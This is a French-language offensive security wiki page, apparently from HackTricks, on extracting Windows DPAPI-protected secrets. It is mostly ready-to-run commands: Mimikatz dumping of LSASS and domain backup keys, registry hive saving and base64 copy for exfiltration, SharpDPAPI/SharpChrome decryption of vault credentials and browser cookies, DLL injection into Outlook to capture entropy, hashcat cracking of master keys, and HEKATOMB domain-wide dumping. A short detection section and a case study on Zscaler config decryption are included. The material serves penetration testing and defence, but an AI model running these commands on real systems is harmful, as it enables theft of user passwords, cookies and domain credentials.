# DPAPI - Extraction des mots de passe

{{#include ../../banners/hacktricks-training.md}}



## Qu'est-ce que DPAPI

The Data Protection API (DPAPI) est principalement utilisé dans le système d'exploitation Windows pour le **chiffrement symétrique de clés privées asymétriques**, en s'appuyant soit sur des secrets utilisateur soit sur des secrets système comme source importante d'entropie. Cette approche simplifie le chiffrement pour les développeurs en leur permettant de chiffrer des données à l'aide d'une clé dérivée des secrets de connexion de l'utilisateur ou, pour le chiffrement système, des secrets d'authentification du domaine, évitant ainsi aux développeurs de devoir gérer la protection de la clé de chiffrement eux-mêmes.

La manière la plus courante d'utiliser DPAPI est via les fonctions **`CryptProtectData` et `CryptUnprotectData`**, qui permettent aux applications de chiffrer et déchiffrer des données de manière sécurisée avec la session du processus actuellement connecté. Cela signifie que les données chiffrées ne peuvent être déchiffrées que par le même utilisateur ou système qui les a chiffrées.

De plus, ces fonctions acceptent aussi un **`entropy` parameter** qui sera également utilisé lors du chiffrement et du déchiffrement ; par conséquent, pour déchiffrer quelque chose chiffré en utilisant ce paramètre, vous devez fournir la même valeur d'entropie qui a été utilisée lors du chiffrement.

### Génération de la clé utilisateur

The DPAPI génère une clé unique (appelée **`pre-key`**) pour chaque utilisateur basée sur ses identifiants. Cette clé est dérivée du mot de passe de l'utilisateur et d'autres facteurs ; l'algorithme dépend du type d'utilisateur mais se termine par un SHA1. Par exemple, pour les utilisateurs de domaine, **cela dépend du NTLM hash de l'utilisateur**.

Ceci est particulièrement intéressant car si un attaquant peut obtenir le hash du mot de passe de l'utilisateur, il peut :

- **Decrypt any data that was encrypted using DPAPI** avec la clé de cet utilisateur sans avoir besoin de contacter une API
- Essayer de **crack the password** hors ligne en tentant de générer la clé DPAPI valide

De plus, chaque fois que des données sont chiffrées par un utilisateur en utilisant DPAPI, une nouvelle **master key** est générée. Cette master key est celle réellement utilisée pour chiffrer les données. Chaque master key reçoit un **GUID** (Globally Unique Identifier) qui l'identifie.

Les master keys sont stockées dans le répertoire **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, où `{SID}` est le Security Identifier de cet utilisateur. La master key est stockée chiffrée par la **`pre-key`** de l'utilisateur et aussi par une **domain backup key** pour la récupération (donc la même clé est stockée chiffrée 2 fois avec deux clés différentes).

Notez que la **domain key utilisée pour chiffrer la master key se trouve dans les domain controllers et ne change jamais**, donc si un attaquant a accès au domain controller, il peut récupérer la domain backup key et déchiffrer les master keys de tous les utilisateurs du domaine.

Les blobs chiffrés contiennent le **GUID de la master key** qui a été utilisée pour chiffrer les données dans leurs en-têtes.

> [!TIP]
> Les blobs chiffrés DPAPI commencent par **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Génération de la clé Machine/Système

C'est la clé utilisée par la machine pour chiffrer des données. Elle est basée sur le **DPAPI_SYSTEM LSA secret**, qui est une clé spéciale accessible uniquement par l'utilisateur SYSTEM. Cette clé est utilisée pour chiffrer des données devant être accessibles par le système lui-même, comme des identifiants au niveau machine ou des secrets système.

Notez que ces clés **n'ont pas de sauvegarde de domaine**, elles sont donc accessibles uniquement localement :

- **Mimikatz** peut y accéder en extrayant les LSA secrets avec la commande : `mimikatz lsadump::secrets`
- Le secret est stocké dans le registre, donc un administrateur pourrait **modifier les permissions DACL pour y accéder**. Le chemin du registre est : `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- L'extraction hors-ligne des hives du registre est également possible. Par exemple, en tant qu'administrateur sur la cible, sauvegardez les hives et exfiltrez-les :
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Ensuite, sur votre machine d'analyse, récupérez le DPAPI_SYSTEM LSA secret depuis les hives et utilisez-le pour déchiffrer les blobs à l'échelle machine (mots de passe des tâches planifiées, identifiants de service, profils Wi‑Fi, etc.) :
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Données protégées par DPAPI

Parmi les données personnelles protégées par DPAPI, on trouve :

- Windows creds
- les mots de passe d'Internet Explorer et de Google Chrome et les données d'auto-complétion
- les mots de passe d'e-mail et des comptes FTP internes pour des applications comme Outlook et Windows Mail
- mots de passe pour les dossiers partagés, les ressources, les réseaux sans fil, et Windows Vault, y compris les clés de chiffrement
- mots de passe pour les connexions Remote Desktop, .NET Passport, et clés privées pour divers usages de chiffrement et d'authentification
- mots de passe réseau gérés par Credential Manager et données personnelles dans des applications utilisant CryptProtectData, comme Skype, MSN messenger, et plus
- blobs chiffrés dans le registre
- ...

Les données protégées au niveau système comprennent :
- mots de passe Wifi
- mots de passe des tâches planifiées
- ...

### Options d'extraction de la master key

- Si l'utilisateur a les privilèges domain admin, il peut accéder à la **domain backup key** pour déchiffrer toutes les master keys des utilisateurs du domaine :
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Avec des privilèges d'administrateur local, il est possible d'**accéder à la mémoire LSASS** pour extraire les clés maîtresses DPAPI de tous les utilisateurs connectés et la clé SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Si l'utilisateur dispose de privilèges d'administrateur local, il peut accéder au **DPAPI_SYSTEM LSA secret** pour déchiffrer les clés maîtresses de la machine :
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Si le mot de passe ou le hash NTLM de l'utilisateur est connu, vous pouvez **décrypter directement les master keys de l'utilisateur** :
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Si vous êtes dans une session en tant qu'utilisateur, il est possible de demander au DC la **clé de sauvegarde pour déchiffrer les master keys via RPC**. Si vous êtes administrateur local et que l'utilisateur est connecté, vous pourriez **voler son session token** pour cela :
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lister Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Accéder aux données chiffrées DPAPI

### Trouver des données chiffrées DPAPI

Les fichiers utilisateur couramment **protégés** se trouvent dans :

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Pensez aussi à remplacer `\Roaming\` par `\Local\` dans les chemins ci-dessus.

Exemples d'énumération :
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) peut trouver des blobs chiffrés DPAPI dans le système de fichiers, le registre et des blobs B64 :
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Notez que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (du même repo) peut être utilisé pour déchiffrer, via DPAPI, des données sensibles comme les cookies.

#### Chromium/Edge/Electron recettes rapides (SharpChrome)

- Utilisateur actuel, décryptage interactif des identifiants/cookies enregistrés (fonctionne même avec les cookies app-bound de Chrome 127+ car la clé supplémentaire est résolue à partir du Credential Manager de l’utilisateur lorsqu'il est exécuté dans le contexte de l'utilisateur) :
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Analyse hors ligne lorsque vous n'avez que des fichiers. Commencez par extraire la clé d'état AES du profil "Local State" puis utilisez-la pour décrypter la cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage à l'échelle du domaine/à distance lorsque vous avez la DPAPI domain backup key (PVK) et admin sur l'hôte cible :
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Si vous avez la DPAPI prekey/credkey d’un utilisateur (depuis LSASS), vous pouvez ignorer password cracking et déchiffrer directement les données de profil :
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Remarques
- Les versions récentes de Chrome/Edge peuvent stocker certains cookies en utilisant le chiffrement "App-Bound". Offline decryption de ces cookies spécifiques n'est pas possible sans la clé app-bound supplémentaire ; exécutez SharpChrome dans le contexte de l'utilisateur cible pour la récupérer automatiquement. Voir le Chrome security blog post référencé ci-dessous.

### Accès aux clés et données

- **Use SharpDPAPI** pour obtenir des credentials depuis des fichiers DPAPI encrypted de la session actuelle :
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obtenir les informations de credentials** comme les données chiffrées et le guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Accéder aux masterkeys**:

Décrypter le masterkey d'un utilisateur demandant la **domain backup key** en utilisant RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
L'outil **SharpDPAPI** prend également en charge ces arguments pour le déchiffrement du masterkey (remarquez qu'il est possible d'utiliser `/rpc` pour obtenir la clé de sauvegarde du domaine, `/password` pour utiliser un mot de passe en clair, ou `/pvk` pour spécifier un fichier de clé privée DPAPI du domaine...) :
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Déchiffrer des données en utilisant une masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
L'outil **SharpDPAPI** prend également en charge ces arguments pour le déchiffrement de `credentials|vaults|rdg|keepass|triage|blob|ps` (notez qu'il est possible d'utiliser `/rpc` pour obtenir la clé de sauvegarde du domaine, `/password` pour utiliser un mot de passe en clair, `/pvk` pour spécifier un fichier de clé privée de domaine DPAPI, `/unprotect` pour utiliser la session de l'utilisateur courant...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Utiliser une DPAPI prekey/credkey directement (aucun password nécessaire)

Si vous pouvez dumper LSASS, Mimikatz expose souvent une DPAPI key par connexion (per-logon) qui peut être utilisée pour déchiffrer les masterkeys de l'utilisateur sans connaître le plaintext password. Transmettez cette valeur directement au tooling :
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Déchiffrer des données en utilisant la **session utilisateur actuelle**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### Déchiffrement hors ligne avec Impacket dpapi.py

Si vous avez le SID et le mot de passe (ou le NT hash) de l’utilisateur victime, vous pouvez déchiffrer les DPAPI masterkeys et les Credential Manager blobs entièrement hors ligne en utilisant Impacket’s dpapi.py.

- Identifier les artefacts sur le disque:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Si l’outil de transfert de fichiers est instable, encodez les fichiers en base64 sur l’hôte et copiez la sortie:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Décrypter la masterkey avec le SID de l'utilisateur et le password/hash :
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Utilisez la masterkey déchiffrée pour déchiffrer le credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Ce workflow récupère souvent des identifiants de domaine enregistrés par des applications utilisant le Windows Credential Manager, y compris des comptes administratifs (par ex., `*_adm`).

---

### Gestion de l'entropie optionnelle ("Third-party entropy")

Certaines applications passent une valeur supplémentaire d'**entropie** à `CryptProtectData`. Sans cette valeur, le blob ne peut pas être déchiffré, même si le masterkey correct est connu. Obtenir l'entropie est donc essentiel lorsqu'on cible des identifiants protégés de cette manière (par ex. Microsoft Outlook, certains clients VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) est une DLL en mode utilisateur qui intercepte les fonctions DPAPI dans le processus ciblé et enregistre de manière transparente toute entropie optionnelle fournie. L'exécution d'EntropyCapture en mode **DLL-injection** contre des processus comme `outlook.exe` ou `vpnclient.exe` produira un fichier associant chaque buffer d'entropie au processus appelant et au blob. L'entropie capturée peut ensuite être fournie à **SharpDPAPI** (`/entropy:`) ou **Mimikatz** (`/entropy:<file>`) afin de déchiffrer les données.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Craquage des masterkeys hors ligne (Hashcat & DPAPISnoop)

Microsoft a introduit un format de masterkey **context 3** à partir de Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) a ajouté les hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) et **22102** (context 3), permettant le craquage accéléré par GPU des mots de passe utilisateur directement à partir du fichier masterkey. Les attaquants peuvent donc effectuer des word-list ou brute-force sans interagir avec le système cible.

`DPAPISnoop` (2024) automatise le processus:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
L'outil peut également analyser les blobs Credential et Vault, les déchiffrer avec des clés craquées et exporter les mots de passe en clair.

### Accéder aux données d'une autre machine

Dans **SharpDPAPI and SharpChrome** vous pouvez indiquer l'option **`/server:HOST`** pour accéder aux données d'une machine distante. Bien sûr vous devez être en mesure d'accéder à cette machine et dans l'exemple suivant il est supposé que la **clé de chiffrement de sauvegarde du domaine est connue**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Autres outils

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) est un outil qui automatise l'extraction de tous les utilisateurs et ordinateurs depuis l'annuaire LDAP et l'extraction de la domain controller backup key via RPC. Le script résoudra ensuite toutes les adresses IP des ordinateurs et effectuera un smbclient sur tous les ordinateurs pour récupérer tous les blobs DPAPI de tous les utilisateurs et tout déchiffrer avec la domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Avec la liste d'ordinateurs extraite de LDAP vous pouvez trouver chaque sous-réseau même si vous ne les connaissiez pas !

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) peut dumper automatiquement les secrets protégés par DPAPI. La release 2.x a introduit :

* Collecte parallèle de blobs depuis des centaines d'hôtes
* Parsing des masterkeys **context 3** et intégration automatique du cracking avec Hashcat
* Support des cookies chiffrés Chrome "App-Bound" (voir la section suivante)
* Un nouveau mode **`--snapshot`** pour interroger répétitivement les endpoints et comparer (diff) les blobs nouvellement créés

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) est un parser en C# pour fichiers masterkey/credential/vault qui peut produire des formats Hashcat/JtR et éventuellement lancer le cracking automatiquement. Il supporte pleinement les formats de masterkey machine et utilisateur jusqu'à Windows 11 24H1.


## Détections courantes

- Accès aux fichiers dans `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` et autres répertoires liés à DPAPI.
- Particulièrement depuis un partage réseau comme **C$** ou **ADMIN$**.
- Utilisation de **Mimikatz**, **SharpDPAPI** ou d'outils similaires pour accéder à la mémoire LSASS ou dumper des masterkeys.
- Événement **4662** : *An operation was performed on an object* – peut être corrélé avec l'accès à l'objet **`BCKUPKEY`**.
- Événement **4673/4674** lorsqu'un processus demande *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnérabilités & changements de l'écosystème 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembre 2023). Un attaquant avec accès réseau pouvait tromper un membre de domaine pour qu'il récupère une DPAPI backup key malveillante, permettant le déchiffrement des masterkeys utilisateur. Corrigé dans le cumulative update de novembre 2023 – les administrateurs doivent s'assurer que les DCs et postes de travail sont entièrement patchés.
* **Chrome 127 “App-Bound” cookie encryption** (juillet 2024) a remplacé la protection héritée uniquement DPAPI par une clé additionnelle stockée dans le **Credential Manager** de l'utilisateur. Le déchiffrement hors-ligne des cookies requiert désormais à la fois le DPAPI masterkey et la **GCM-wrapped app-bound key**. SharpChrome v2.3 et DonPAPI 2.x sont capables de récupérer la clé supplémentaire lorsqu'ils s'exécutent dans le contexte utilisateur.


### Étude de cas : Zscaler Client Connector – Entropie personnalisée dérivée du SID

Zscaler Client Connector stocke plusieurs fichiers de configuration sous `C:\ProgramData\Zscaler` (par ex. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Chaque fichier est chiffré avec **DPAPI (Machine scope)** mais le fournisseur fournit une **entropie personnalisée** qui est *calculée à l'exécution* au lieu d'être stockée sur le disque.

L'entropie est reconstruite à partir de deux éléments :

1. Un secret codé en dur intégré dans `ZSACredentialProvider.dll`.
2. Le **SID** du compte Windows auquel appartient la configuration.

L'algorithme implémenté par la DLL est équivalent à :
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Parce que le secret est intégré dans une DLL qui peut être lue depuis le disque, **tout attaquant local disposant des droits SYSTEM peut régénérer l'entropie pour n'importe quel SID** et décrypter les blobs hors ligne :
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Le déchiffrement révèle la configuration JSON complète, incluant chaque **contrôle de posture de l'appareil** et sa valeur attendue – des informations très précieuses lors de tentatives de contournement côté client.

> ASTUCE : les autres artefacts chiffrés (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sont protégés avec DPAPI **sans** entropie (`16` octets nuls). Ils peuvent donc être déchiffrés directement avec `ProtectedData.Unprotect` une fois les privilèges SYSTEM obtenus.

## Références

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
